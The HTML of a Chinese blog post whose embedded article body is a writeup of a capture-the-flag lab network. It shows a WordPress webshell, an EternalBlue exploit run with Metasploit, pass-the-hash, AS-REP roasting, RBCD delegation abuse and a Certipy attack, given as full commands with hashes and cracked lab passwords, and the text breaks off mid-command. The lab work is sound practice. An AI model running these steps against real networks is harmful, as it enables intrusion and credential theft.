@@ -1,0 +1,845 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto" data-theme="dark">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>春秋云镜-网鼎2022半决复盘-Writeup | Xrntkk&#39;s Blog</title>
+<meta name="keywords" content="writeup, 渗透, 春秋云镜">
+<meta name="description" content="FLAG1
+
+入口机有一个wordpress服务
+wpscan没扫出漏洞，尝试一下弱口令没想到登进去了
+http://39.99.146.5/wp-admin/
+admin/123456
+
+直接在Edit Plugins就可以写马了
+在主题的akismet.php写个马">
+<meta name="author" content="Xrntkk">
+<link rel="canonical" href="https://blog.xrntkk.top/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-%E7%BD%91%E9%BC%8E2022%E5%A4%8D%E7%9B%98-writeup/">
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <meta name="referrer" content="no-referrer-when-downgrade">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.317863601f03c2b94974bf53f8aaac583e7d21f7d74106e5602576c147c6f679.css" integrity="sha256-MXhjYB8DwrlJdL9T&#43;KqsWD59IffXQQblYCV2wUfG9nk=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://blog.xrntkk.top/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://blog.xrntkk.top/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://blog.xrntkk.top/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://blog.xrntkk.top/apple-touch-icon.png">
+<link rel="mask-icon" href="https://blog.xrntkk.top/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="https://blog.xrntkk.top/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-%E7%BD%91%E9%BC%8E2022%E5%A4%8D%E7%9B%98-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+<meta name="baidu-site-verification" content="codeva-snmPZ4WZk8" /><meta property="og:url" content="https://blog.xrntkk.top/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-%E7%BD%91%E9%BC%8E2022%E5%A4%8D%E7%9B%98-writeup/">
+  <meta property="og:site_name" content="Xrntkk&#39;s Blog">
+  <meta property="og:title" content="春秋云镜-网鼎2022半决复盘-Writeup">
+  <meta property="og:description" content="FLAG1 入口机有一个wordpress服务
+wpscan没扫出漏洞，尝试一下弱口令没想到登进去了
+http://39.99.146.5/wp-admin/ admin/123456
+直接在Edit Plugins就可以写马了
+在主题的akismet.php写个马">
+  <meta property="og:locale" content="zh">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2025-05-12T22:03:55+08:00">
+    <meta property="article:modified_time" content="2025-05-12T22:03:55+08:00">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="渗透">
+    <meta property="article:tag" content="春秋云镜">
+      <meta property="og:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
+<meta name="twitter:title" content="春秋云镜-网鼎2022半决复盘-Writeup">
+<meta name="twitter:description" content="FLAG1
+
+入口机有一个wordpress服务
+wpscan没扫出漏洞，尝试一下弱口令没想到登进去了
+http://39.99.146.5/wp-admin/
+admin/123456
+
+直接在Edit Plugins就可以写马了
+在主题的akismet.php写个马">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://blog.xrntkk.top/post/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "春秋云镜-网鼎2022半决复盘-Writeup",
+      "item": "https://blog.xrntkk.top/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-%E7%BD%91%E9%BC%8E2022%E5%A4%8D%E7%9B%98-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "春秋云镜-网鼎2022半决复盘-Writeup",
+  "name": "春秋云镜-网鼎2022半决复盘-Writeup",
+  "description": "FLAG1 入口机有一个wordpress服务\nwpscan没扫出漏洞，尝试一下弱口令没想到登进去了\nhttp://39.99.146.5/wp-admin/ admin/123456\n直接在Edit Plugins就可以写马了\n在主题的akismet.php写个马\n",
+  "keywords": [
+    "writeup", "渗透", "春秋云镜"
+  ],
+  "articleBody": "FLAG1 入口机有一个wordpress服务\nwpscan没扫出漏洞，尝试一下弱口令没想到登进去了\nhttp://39.99.146.5/wp-admin/ admin/123456\n直接在Edit Plugins就可以写马了\n在主题的akismet.php写个马\n访问 /wp-content/plugins/akismet/akismet.php\n拿蚁剑连一下\n拿到第一个flag\n________ ___ ________ ________ ________ _____ |\\ _____\\\\ \\ |\\ __ \\|\\ ____\\|\\ __ \\ / __ \\ \\ \\ \\__/\\ \\ \\ \\ \\ \\|\\ \\ \\ \\___|\\ \\ \\|\\ \\|\\/_|\\ \\ \\ \\ __\\\\ \\ \\ \\ \\ __ \\ \\ \\ __\\ \\ \\\\\\ \\|/ \\ \\ \\ \\ \\ \\_| \\ \\ \\____\\ \\ \\ \\ \\ \\ \\|\\ \\ \\ \\\\\\ \\ \\ \\ \\ \\ \\__\\ \\ \\_______\\ \\__\\ \\__\\ \\_______\\ \\_______\\ \\ \\__\\\r\\|__| \\|_______|\\|__|\\|__|\\|_______|\\|_______| \\|__|\rflag01: flag{a1c9f11e-1033-4f2a-95f0-032f1ff79d22} FLAG2 先用vshell上个线\n然后信息收集一手\n1www-data@ubuntu-web:/tmp$ ip addr show 21: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 3 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 4 inet 127.0.0.1/8 scope host lo 5 valid_lft forever preferred_lft forever 6 inet6 ::1/128 scope host 7 valid_lft forever preferred_lft forever 82: eth0: mtu 1500 qdisc mq state UP group default qlen 1000 9 link/ether 00:16:3e:27:06:38 brd ff:ff:ff:ff:ff:ff 10 inet 172.22.15.26/16 brd 172.22.255.255 scope global dynamic eth0 11 valid_lft 315357725sec preferred_lft 315357725sec 12 inet6 fe80::216:3eff:fe27:638/64 scope link 13 valid_lft forever preferred_lft forever 14 内网IP是172.22.15.26\n传个fscan扫一下内网\n1www-data@ubuntu-web:/tmp$ ./fs -h 172.22.15.0/24 2┌──────────────────────────────────────────────┐ 3│ ___ _ │ 4│ / _ \\ ___ ___ _ __ __ _ ___| | __ │ 5│ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / │ 6│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c │ 7│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ 8└──────────────────────────────────────────────┘ 9 Fscan Version: 2.0.0 10 11[2025-03-27 15:06:48] [INFO] 暴力破解线程数: 1 12[2025-03-27 15:06:48] [INFO] 开始信息扫描 13[2025-03-27 15:06:48] [INFO] CIDR范围: 172.22.15.0-172.22.15.255 14[2025-03-27 15:06:48] [INFO] 生成IP范围: 172.22.15.0.%!d(string=172.22.15.255) - %!s(MISSING).%!d(MISSING) 15[2025-03-27 15:06:48] [INFO] 解析CIDR 172.22.15.0/24 -\u003e IP范围 172.22.15.0-172.22.15.255 16[2025-03-27 15:06:48] [INFO] 最终有效主机数量: 256 17[2025-03-27 15:06:48] [INFO] 开始主机扫描 18[2025-03-27 15:06:48] [INFO] 正在尝试无监听ICMP探测... 19[2025-03-27 15:06:49] [INFO] 当前用户权限不足,无法发送ICMP包 20[2025-03-27 15:06:49] [INFO] 切换为PING方式探测... 21[2025-03-27 15:06:49] [SUCCESS] 目标 172.22.15.24 存活 (ICMP) 22[2025-03-27 15:06:49] [SUCCESS] 目标 172.22.15.26 存活 (ICMP) 23[2025-03-27 15:06:49] [SUCCESS] 目标 172.22.15.35 存活 (ICMP) 24[2025-03-27 15:06:49] [SUCCESS] 目标 172.22.15.13 存活 (ICMP) 25[2025-03-27 15:06:49] [SUCCESS] 目标 172.22.15.18 存活 (ICMP) 26[2025-03-27 15:06:55] [INFO] 存活主机数量: 5 27[2025-03-27 15:06:55] [INFO] 有效端口数量: 233 28[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.18:80 29[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.24:80 30[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.26:80 31[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.13:88 32[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.35:135 33[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.13:135 34[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.24:135 35[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.13:139 36[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.18:139 37[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.35:139 38[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.18:135 39[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.24:139 40[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.13:389 41[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.24:445 42[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.26:22 43[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.35:445 44[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.13:445 45[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.18:445 46[2025-03-27 15:06:56] [SUCCESS] 服务识别 172.22.15.26:22 =\u003e [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.] 47[2025-03-27 15:07:00] [SUCCESS] 服务识别 172.22.15.18:80 =\u003e [http] 48[2025-03-27 15:07:00] [SUCCESS] 服务识别 172.22.15.24:80 =\u003e [http] 49[2025-03-27 15:07:00] [SUCCESS] 服务识别 172.22.15.26:80 =\u003e [http] 50[2025-03-27 15:07:00] [SUCCESS] 服务识别 172.22.15.13:88 =\u003e 51[2025-03-27 15:07:00] [SUCCESS] 服务识别 172.22.15.13:139 =\u003e Banner:[.] 52[2025-03-27 15:07:00] [SUCCESS] 服务识别 172.22.15.18:139 =\u003e Banner:[.] 53[2025-03-27 15:07:00] [SUCCESS] 服务识别 172.22.15.35:139 =\u003e Banner:[.] 54[2025-03-27 15:07:00] [SUCCESS] 服务识别 172.22.15.24:139 =\u003e Banner:[.] 55[2025-03-27 15:07:00] [SUCCESS] 服务识别 172.22.15.13:389 =\u003e [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name 56[2025-03-27 15:07:00] [SUCCESS] 服务识别 172.22.15.24:445 =\u003e 57[2025-03-27 15:07:01] [SUCCESS] 服务识别 172.22.15.35:445 =\u003e 58[2025-03-27 15:07:01] [SUCCESS] 服务识别 172.22.15.13:445 =\u003e 59[2025-03-27 15:07:01] [SUCCESS] 服务识别 172.22.15.18:445 =\u003e 60[2025-03-27 15:07:01] [SUCCESS] 端口开放 172.22.15.24:3306 61[2025-03-27 15:07:01] [SUCCESS] 服务识别 172.22.15.24:3306 =\u003e [mysql] 版本:5.7.26 产品:MySQL Banner:[J.5.7.26.7R%P yS.L6.nX W :IN mysql_native_password] 62[2025-03-27 15:08:00] [SUCCESS] 服务识别 172.22.15.35:135 =\u003e 63[2025-03-27 15:08:00] [SUCCESS] 服务识别 172.22.15.13:135 =\u003e 64[2025-03-27 15:08:00] [SUCCESS] 服务识别 172.22.15.24:135 =\u003e 65[2025-03-27 15:08:00] [SUCCESS] 服务识别 172.22.15.18:135 =\u003e 66[2025-03-27 15:08:00] [INFO] 存活端口数量: 19 67[2025-03-27 15:08:00] [INFO] 开始漏洞扫描 68[2025-03-27 15:08:00] [INFO] 加载的插件: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle 69[2025-03-27 15:08:01] [SUCCESS] NetInfo 扫描结果 70目标主机: 172.22.15.18 71主机名: XR-CA 72发现的网络接口: 73 IPv4地址: 74 └─ 172.22.15.18 75[2025-03-27 15:08:01] [SUCCESS] NetInfo 扫描结果 76目标主机: 172.22.15.24 77主机名: XR-WIN08 78发现的网络接口: 79 IPv4地址: 80 └─ 172.22.15.24 81[2025-03-27 15:08:01] [SUCCESS] NetInfo 扫描结果 82目标主机: 172.22.15.13 83主机名: XR-DC01 84发现的网络接口: 85 IPv4地址: 86 └─ 172.22.15.13 87[2025-03-27 15:08:01] [SUCCESS] 网站标题 http://172.22.15.18 状态码:200 长度:703 标题:IIS Windows Server 88[2025-03-27 15:08:01] [SUCCESS] NetInfo 扫描结果 89目标主机: 172.22.15.35 90主机名: XR-0687 91发现的网络接口: 92 IPv4地址: 93 └─ 172.22.15.35 94[2025-03-27 15:08:01] [INFO] 系统信息 172.22.15.13 [Windows Server 2016 Standard 14393] 95[2025-03-27 15:08:01] [SUCCESS] 网站标题 http://172.22.15.24 状态码:302 长度:0 标题:无标题 重定向地址: http://172.22.15.24/www 96[2025-03-27 15:08:01] [SUCCESS] NetBios 172.22.15.35 XIAORANG\\XR-0687 97[2025-03-27 15:08:01] [SUCCESS] NetBios 172.22.15.24 WORKGROUP\\XR-WIN08 Windows Server 2008 R2 Enterprise 7601 Service Pack 1 98[2025-03-27 15:08:01] [SUCCESS] NetBios 172.22.15.13 DC:XR-DC01.xiaorang.lab Windows Server 2016 Standard 14393 99[2025-03-27 15:08:01] [SUCCESS] NetBios 172.22.15.18 XR-CA.xiaorang.lab Windows Server 2016 Standard 14393 100[2025-03-27 15:08:01] [SUCCESS] 发现漏洞 172.22.15.24 [Windows Server 2008 R2 Enterprise 7601 Service Pack 1] MS17-010 101[2025-03-27 15:08:01] [SUCCESS] 网站标题 http://172.22.15.26 状态码:200 长度:39962 标题:XIAORANG.LAB 102[2025-03-27 15:08:01] [SUCCESS] 目标: http://172.22.15.18:80 103 漏洞类型: poc-yaml-active-directory-certsrv-detect 104 漏洞名称: 105 详细信息: 106 author:AgeloVito 107 links:https://www.cnblogs.com/EasonJim/p/6859345.html 108[2025-03-27 15:08:01] [SUCCESS] 网站标题 http://172.22.15.24/www/sys/index.php 状态码:200 长度:135 标题:无标题 109[2025-03-27 15:08:25] [SUCCESS] 扫描已完成: 35/35 扫出内网的四台机子\n目标主机: 172.22.15.18\r主机名: XR-CA\r目标主机: 172.22.15.24\r主机名: XR-WIN08\r目标主机: 172.22.15.13\r主机名: XR-DC01\r目标主机: 172.22.15.35\r主机名: XR-0687 172.22.15.24扫出来有MS17-010(永恒之蓝)漏洞\n那直接用msf来打\nproxychains4 msfconsole\ruse exploit/windows/smb/ms17_010_eternalblue # 选择使用的模块\rset payload windows/x64/meterpreter/bind_tcp # 设置payload，可以通过show payloads查看\rset RHOSTS 172.22.15.24 # 设置靶机的ip\rexploit # 发起攻击 打了好几次终于通了，但是msf的shell有点问题，用不了\n先用msf读个flag\n__ _ ___ __\r/ _| | / _ \\/_ |\r| |_| | __ _ __ _| | | || |\r| _| |/ _` |/ _` | | | || |\r| | | | (_| | (_| | |_| || |\r|_| |_|\\__,_|\\__, |\\___/ |_|\r__/ |\r|___/\rflag02: flag{2e191985-3660-4b3a-b1c5-01be8b41c15e} 也可以用hashdump拿到哈希\nmeterpreter \u003e hashdump\r[proxychains] DLL init: proxychains-ng 4.17\r[proxychains] DLL init: proxychains-ng 4.17\rAdministrator:500:aad3b435b51404eeaad3b435b51404ee:0e52d03e9b939997401466a0ec5a9cbc:::\rGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\r[proxychains] DLL init: proxychains-ng 4.17\r[proxychains] DLL init: proxychains-ng 4.17\r[proxychains] DLL init: proxychains-ng 4.17\r[proxychains] DLL init: proxychains-ng 4.17\r[proxychains] DLL init: proxychains-ng 4.17 拿到hash可以用psexec横向移动\nproxychains4 python psexec.py administrator@172.22.15.24 -hashes ':0e52d03e9b939997401466a0ec5a9cbc' -codec gbk 接着读flag\nFLAG3-RDBC 接着看 172.22.15.24\n访问 /www/sys/index.php\n默认密码admin/123456成功登入\n这个oa系统没办法直接拿到shell\n但是我们可以进行一些信息收集\n在团队-\u003e同事页面可以收集到一堆邮箱\n我们可以利用这堆邮箱来构造用户名字典\nlixiuying@xiaorang.lab\rlixiaoliang@xiaorang.lab\rzhangyi@xiaorang.lab\rjiaxiaoliang@xiaorang.lab\rzhangli@xiaorang.lab\rzhangwei@xiaorang.lab\rliuqiang@xiaorang.lab\rwangfang@xiaorang.lab\rwangwei@xiaorang.lab\rwanglihong@xiaorang.lab\rhuachunmei@xiaorang.lab\rwanghao@xiaorang.lab\rzhangxinyu@xiaorang.lab\rhuzhigang@xiaorang.lab\rlihongxia@xiaorang.lab\rwangyulan@xiaorang.lab\rchenjianhua@xiaorang.lab 在后续进行爆破的时候可以使用\n这里我们猜测机子未开启预身份验证，尝试使用AS-REP Roasting攻击\nAS-REP Roasting是一种对用户账户进行离线爆破的攻击方式。但是该攻击方式使用上比较受限，因为其需要用户账户设置不要求Kerberos 预身份验证选项，而该选项默认是没有勾选的。Kerberos 预身份验证发生在 Kerberos 身份验证的第一阶段（AS_REQ\u0026AS REP），它的主要作用是防止密码离线爆破。默认情况下，预身份验证是开启的，KDC 会记录密码错误次数，防止在线爆破。\r当关闭了预身份验证后，攻击者可以使用指定用户向域控制器的 Kerberos 88 端口请求票据，此时域控不会进行任何验证就将 TGT 和该用户 Hash 加密的 Login Session Key 返回。因此，攻击者就可以对获取到的用户 Hash 加密的 Login Session Key 进行离线破解，如果字典够强大，则可能破解得到该指定用户的明文密码。\r————————————————\r原文链接：https://blog.csdn.net/weixin_45954730/article/details/140647751 这里使用impacket-GetNPUsers工具，这个工具会尝试获得并列出不需要Kerberos域认证的用户\nproxychains4 impacket-GetNPUsers -dc-ip 172.22.15.13 -usersfile username.txt xiaorang.lab/ 结果\n┌──(root㉿Xrntkk-Laptop)-[/home/xrntkk]\r└─# proxychains4 impacket-GetNPUsers -dc-ip 172.22.15.13 -usersfile username.txt xiaorang.lab/\r[proxychains] config file found: /etc/proxychains4.conf\r[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\r[proxychains] DLL init: proxychains-ng 4.17\r[proxychains] DLL init: proxychains-ng 4.17\r[proxychains] DLL init: proxychains-ng 4.17\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\r/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\rnow = datetime.datetime.utcnow() + datetime.timedelta(days=1)\r[proxychains] Strict chain ... 113.45.175.138:6666 ... 172.22.15.13:88 ... OK\r$krb5asrep$23$lixiuying@xiaorang.lab@XIAORANG.LAB:9159559ba318af794bad4ac369b60a1e$2dd93a8a64ff9e932b1707c3e2fbdd379ced93ffb975f5d7dd52b728e0f7dd0c0ea0cc7ffb924897a1a6c1bee062e1b2fb25431f45f4b44ad73a390269d5c5df8b74591b07db87cb22d0de7c5540996343304336da5b11c412b1613b8b2b59c774ce1c6cc99556b0c63484533be7790a058c994b3c9be8fdc780ff9ab5a1e0a0f2c560665dd221335baadb5eca7577290085079fe8cd9da81d7bcaae840133efad3de3698e4e43a617d0d8d9fcb981f9184f2ac639a65640774d409453ab4754d8107d89c12c1a41acf1b23c9bbcc8ec35743b746936a8d34ea3c031b274058826d48ee5ae7f954cb01770ac\r[proxychains] Strict chain ... 113.45.175.138:6666 ... 172.22.15.13:88 ... OK\r[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\r[proxychains] Strict chain ... 113.45.175.138:6666 ... 172.22.15.13:88 ... OK\r[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\r[proxychains] Strict chain ... 113.45.175.138:6666 ... 172.22.15.13:88 ... OK\r[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\r[proxychains] Strict chain ... 113.45.175.138:6666 ... 172.22.15.13:88 ... OK\r[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\r[proxychains] Strict chain ... 113.45.175.138:6666 ... 172.22.15.13:88 ... OK\r[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\r[proxychains] Strict chain ... 113.45.175.138:6666 ... 172.22.15.13:88 ... OK\r[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\r[proxychains] Strict chain ... 113.45.175.138:6666 ... 172.22.15.13:88 ... OK\r[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\r[proxychains] Strict chain ... 113.45.175.138:6666 ... 172.22.15.13:88 ... OK\r[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\r[proxychains] Strict chain ... 113.45.175.138:6666 ... 172.22.15.13:88 ... OK\r[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\r[proxychains] Strict chain ... 113.45.175.138:6666 ... 172.22.15.13:88 ... OK\r$krb5asrep$23$huachunmei@xiaorang.lab@XIAORANG.LAB:91e6b6e8eca3c81e9ebc041af6fbe6c9$b1de5c61b73c01359b467a40d0ddf8819234b3f383462eec85dc510eb1c3af9ce6718c33a510a131874bea7e2f2651d7d3de029cdb2c6b6e762bebda4756af475bd4c6c06db8ba3944b1608a5e9e7c2bb312db138301a28abc71b8d6cff4e4dfca8e31746d8b1856fc3e3234526bf2b183b79b6b21da685d3db4466505164f8e8e1a5290cabb7ba03c87406fa6eb4c24328f0e40af722bddffb95dff6fb23f1efeb23d0c491d1462c09e952c2783ca3f9ff8bc3b1b8c065df2e7e179801242b1e1643d639b4c2a56ca7fda7df124689b4af63b6ddc30a07299cac1a8b45fe23a3e0ec5078c16ae75880f9ae8\r[proxychains] Strict chain ... 113.45.175.138:6666 ... 172.22.15.13:88 ... OK\r[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\r[proxychains] Strict chain ... 113.45.175.138:6666 ... 172.22.15.13:88 ... OK\r[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\r[proxychains] Strict chain ... 113.45.175.138:6666 ... 172.22.15.13:88 ... OK\r[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\r[proxychains] Strict chain ... 113.45.175.138:6666 ... 172.22.15.13:88 ... OK\r[-] User lihongxia@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\r[proxychains] Strict chain ... 113.45.175.138:6666 ... 172.22.15.13:88 ... OK\r[-] User wangyulan@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\r[proxychains] Strict chain ... 113.45.175.138:6666 ... 172.22.15.13:88 ... OK\r[-] User chenjianhua@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set 拿到了两个用户的TGT票据\n$krb5asrep$23$huachunmei@xiaorang.lab@XIAORANG.LAB:91e6b6e8eca3c81e9ebc041af6fbe6c9$b1de5c61b73c01359b467a40d0ddf8819234b3f383462eec85dc510eb1c3af9ce6718c33a510a131874bea7e2f2651d7d3de029cdb2c6b6e762bebda4756af475bd4c6c06db8ba3944b1608a5e9e7c2bb312db138301a28abc71b8d6cff4e4dfca8e31746d8b1856fc3e3234526bf2b183b79b6b21da685d3db4466505164f8e8e1a5290cabb7ba03c87406fa6eb4c24328f0e40af722bddffb95dff6fb23f1efeb23d0c491d1462c09e952c2783ca3f9ff8bc3b1b8c065df2e7e179801242b1e1643d639b4c2a56ca7fda7df124689b4af63b6ddc30a07299cac1a8b45fe23a3e0ec5078c16ae75880f9ae8\r$krb5asrep$23$lixiuying@xiaorang.lab@XIAORANG.LAB:9159559ba318af794bad4ac369b60a1e$2dd93a8a64ff9e932b1707c3e2fbdd379ced93ffb975f5d7dd52b728e0f7dd0c0ea0cc7ffb924897a1a6c1bee062e1b2fb25431f45f4b44ad73a390269d5c5df8b74591b07db87cb22d0de7c5540996343304336da5b11c412b1613b8b2b59c774ce1c6cc99556b0c63484533be7790a058c994b3c9be8fdc780ff9ab5a1e0a0f2c560665dd221335baadb5eca7577290085079fe8cd9da81d7bcaae840133efad3de3698e4e43a617d0d8d9fcb981f9184f2ac639a65640774d409453ab4754d8107d89c12c1a41acf1b23c9bbcc8ec35743b746936a8d34ea3c031b274058826d48ee5ae7f954cb01770ac 用hashcat和kali自带的字典 rockyou 爆破一下\nhashcat -m 18200 --force -a 0 '$krb5asrep$23$huachunmei@xiaorang.lab@XIAORANG.LAB:91e6b6e8eca3c81e9ebc041af6fbe6c9$b1de5c61b73c01359b467a40d0ddf8819234b3f383462eec85dc510eb1c3af9ce6718c33a510a131874bea7e2f2651d7d3de029cdb2c6b6e762bebda4756af475bd4c6c06db8ba3944b1608a5e9e7c2bb312db138301a28abc71b8d6cff4e4dfca8e31746d8b1856fc3e3234526bf2b183b79b6b21da685d3db4466505164f8e8e1a5290cabb7ba03c87406fa6eb4c24328f0e40af722bddffb95dff6fb23f1efeb23d0c491d1462c09e952c2783ca3f9ff8bc3b1b8c065df2e7e179801242b1e1643d639b4c2a56ca7fda7df124689b4af63b6ddc30a07299cac1a8b45fe23a3e0ec5078c16ae75880f9ae8' ./rockyou.txt\rhashcat -m 18200 --force -a 0 '$krb5asrep$23$lixiuying@xiaorang.lab@XIAORANG.LAB:9159559ba318af794bad4ac369b60a1e$2dd93a8a64ff9e932b1707c3e2fbdd379ced93ffb975f5d7dd52b728e0f7dd0c0ea0cc7ffb924897a1a6c1bee062e1b2fb25431f45f4b44ad73a390269d5c5df8b74591b07db87cb22d0de7c5540996343304336da5b11c412b1613b8b2b59c774ce1c6cc99556b0c63484533be7790a058c994b3c9be8fdc780ff9ab5a1e0a0f2c560665dd221335baadb5eca7577290085079fe8cd9da81d7bcaae840133efad3de3698e4e43a617d0d8d9fcb981f9184f2ac639a65640774d409453ab4754d8107d89c12c1a41acf1b23c9bbcc8ec35743b746936a8d34ea3c031b274058826d48ee5ae7f954cb01770ac' ./rockyou.txt 得到明文密码\nlixiuying@xiaorang.lab/winniethepooh\rhuachunmei@xiaorang.lab/1qaz2wsx 尝试一下rdp连接172.22.15.13\n发现没有权限\n那我们可以尝试拿这两个账户去连其他的机子\n成功登上 172.22.15.35\n先用bloodhound信息收集一手\nproxychains4 bloodhound-python -u lixiuying -p winniethepooh -d xiaorang.lab -c all -ns 172.22.15.13 --zip --dns-tcp 可以看到LIXIUYING@XIAORANG.LAB 对 XR-0687.XIAORANG.LAB 有 GenericWrite 的权限\n可以通过修改目标的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性（配置 RBCD）获取目标 SYSTEM 权限\n添加一个机器用户\nproxychains4 -q impacket-addcomputer -computer-name 'xrntkk$' -computer-pass 'Abc123456' -dc-host XR-DC01.xiaorang.lab -dc-ip 172.22.15.13 \"xiaorang.lab/lixiuying:winniethepooh\" 配置RDBC\nproxychains4 -q impacket-rbcd xiaorang.lab/lixiuying:winniethepooh -action write -delegate-from \"xrntkk$\" -delegate-to \"XR-0687$\" -dc-ip 172.22.15.13 使用 impacket工具的getST执行基于资源的约束性委派工具并获取拥有访问XR-0687机器上的GIFS服务的高权限票据\nproxychains4 -q impacket-getST xiaorang.lab/xrntkk$:'Abc123456' -spn cifs/XR-0687.xiaorang.lab -impersonate Administrator -dc-ip 172.22.15.13 导入票据\nexport KRB5CCNAME=Administrator@cifs_XR-0687.xiaorang.lab@XIAORANG.LAB.ccache 接下来psexec连主机就好了\nproxychains4 -q impacket-psexec 'xiaorang.lab/administrator@XR-0687.xiaorang.lab' -target-ip 172.22.15.35 -codec gbk -no-pass -k flag3\nC:\\Users\\Administrator\\flag\u003e type flag03.txt\r__ _ __ ____\r/ _| |__ _ __ _ / \\__ /\r| _| / _` / _` | () |_ \\\r|_| |_\\__,_\\__, |\\__/___/\r|___/\rflag03: flag{40c21602-c68d-4667-892f-bbb24d452eb4} FLAG4-CVE-2022-26923 Certipy-ad:ly4k/Certipy: Tool for Active Directory Certificate Services enumeration and abuse\n使用certipy-ad工具创建一个账户，并设置dNSHostName\n┌──(root㉿Xrntkk-Laptop)-[/home/xrntkk]\r└─# proxychains4 certipy account create -u lixiuying@xiaorang.lab -p winniethepooh -dc-ip 172.22.15.13 -user xrntkk3 -pa\rss Abc123456 -dns 